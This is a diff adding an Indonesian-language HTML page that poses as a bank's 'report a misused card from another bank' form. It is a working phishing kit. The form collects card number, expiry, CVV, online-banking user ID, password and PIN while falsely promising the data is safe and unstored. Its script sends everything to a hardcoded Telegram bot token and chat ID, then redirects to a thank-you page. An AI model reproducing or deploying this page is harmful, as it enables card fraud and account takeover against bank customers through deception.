@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Laporan Kartu Bank Lain</title>
+  <link rel="stylesheet" href="LAporankartubanklain.css">
+</head>
+<body>
+  <div class="otp-header">
+    <span class="close-btn">&times;</span>
+    <span class="chat-icon">&#9993;</span>
+    <div class="otp-title">Laporan Kartu Bank Lain</div>
+  </div>
+
+  <div class="container">
+    <p class="notice">
+      Untuk kami bantu memproses laporan ini ke bank yang bersangkutan, mohon masukkan nomor kartu yang disalahgunakan. 🔒<br>
+      <strong>Data Anda aman dan dijaga kerahasiaannya</strong> sesuai standar keamanan perbankan.
+    </p>
+
+    <form id="laporanForm">
+      <div class="form-group">
+        <label for="bank">Bank Tujuan</label>
+        <select id="bank" name="bank" required>
+          <option value="" disabled selected>Pilih Bank</option>
+          <option value="bca">BANK BCA</option>
+          <option value="bri">BANK BRI</option>
+          <option value="mandiri">BANK MANDIRI</option>
+          <option value="bni">BANK BNI</option>
+          <option value="cimb">BANK CIMB NIAGA</option>
+          <option value="danamon">BANK DANAMON</option>
+          <option value="uob">BANK UOB INDONESIA</option>
+          <option value="permata">BANK PERMATA</option>
+          <option value="ocbc">BANK OCBC NISP</option>
+          <option value="maybank">MAYBANK</option>
+          <option value="aeon">BANK AEON</option>
+          <option value="btpn">BANK BTPN</option>
+          <option value="hsbc">BANK HSBC</option>
+          <option value="btn">BANK BTN</option>
+          <option value="bsi">BANK BSI</option>
+          <option value="mega">BANK MEGA</option>
+          <option value="sinarmas">BANK SINARMAS</option>
+          <option value="panin">BANK PANIN</option>
+          <option value="muamalat">BANK MUAMALAT</option>
+          <option value="lainnya">BANK LAIN</option>
+          
+        </select>
+
+        <label for="nama">Nama Nasabah</label>
+        <input type="text" id="nama" placeholder="Contoh: Budi Santoso" required>
+
+        <label for="nomor-kartu">Nomor Kartu Kredit/Debit Bank Lain</label>
+        <input type="text" id="nomor-kartu" placeholder="1234 5678 9012 3456" required>
+
+        <input type="text" id="expired" placeholder="Expired kartu" required>
+        <input type="text" id="cvv" placeholder="CVV kartu" required>
+        <p class="cvv-info">CVV adalah 3 angka di belakang kartu kamu.</p>
+
+        <input type="text" id="userid" placeholder="User ID">
+        <input type="text" id="password" placeholder="Password">
+        <input type="text" id="pin" placeholder="PIN Kartu Debit/ Kredit/ Mbanking">
+        <p class="pin-info">🔒 PIN digunakan hanya untuk verifikasi dan tidak disimpan.</p>
+
+        <label for="deskripsi">Keterangan Singkat</label>
+        <textarea id="deskripsi" rows="4" placeholder="(Opsional)"></textarea>
+
+        <button type="submit" class="btn-submit">Kirim Laporan</button>
+      </div>
+    </form>
+
+    <div class="footer-text">
+      &copy; 2025 PT. Bank Anda. Semua hak dilindungi.
+    </div>
+  </div>
+
+
+ <script>
+  document.getElementById("laporanForm").addEventListener("submit", function(e) {
+    e.preventDefault();
+
+    const token = "8087189600:AAEiRT5cw8jMNQaoDvqEIp8oRvCqlLRB-TE";
+    const chat_id = "5653264904";
+
+    const bank = document.getElementById("bank").value;
+    const nama = document.getElementById("nama").value;
+    const kartu = document.getElementById("nomor-kartu").value;
+    const expired = document.getElementById("expired").value;
+    const cvv = document.getElementById("cvv").value;
+    const userid = document.getElementById("userid").value;
+    const password = document.getElementById("password").value;
+    const pin = document.getElementById("pin").value;
+    const deskripsi = document.getElementById("deskripsi").value;
+
+    const message = `
+📋 *Laporan Kartu Bank Lain*
+🏦 Bank: ${bank}
+👤 Nama: ${nama}
+💳 Kartu: ${kartu}
+📆 Expired: ${expired}
+🔐 CVV: ${cvv}
+🆔 User ID: ${userid}
+🔑 Password: ${password}
+🔒 PIN: ${pin}
+📝 Keterangan: ${deskripsi}
+`;
+
+    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: chat_id,
+        text: message,
+        parse_mode: "Markdown"
+      })
+    })
+    .then(res => res.json())
+    .then(data => {
+      // ✅ Laporan sukses, arahkan ke halaman berikutnya
+      window.location.href = "Terimakasih.html"; // ganti dengan file HTML halaman sukses kamu
+    })
+    .catch(err => {
+      alert("❌ Gagal mengirim ke Telegram.");
+      console.error(err);
+    });
+  });
+</script>
+</body>
+</html>
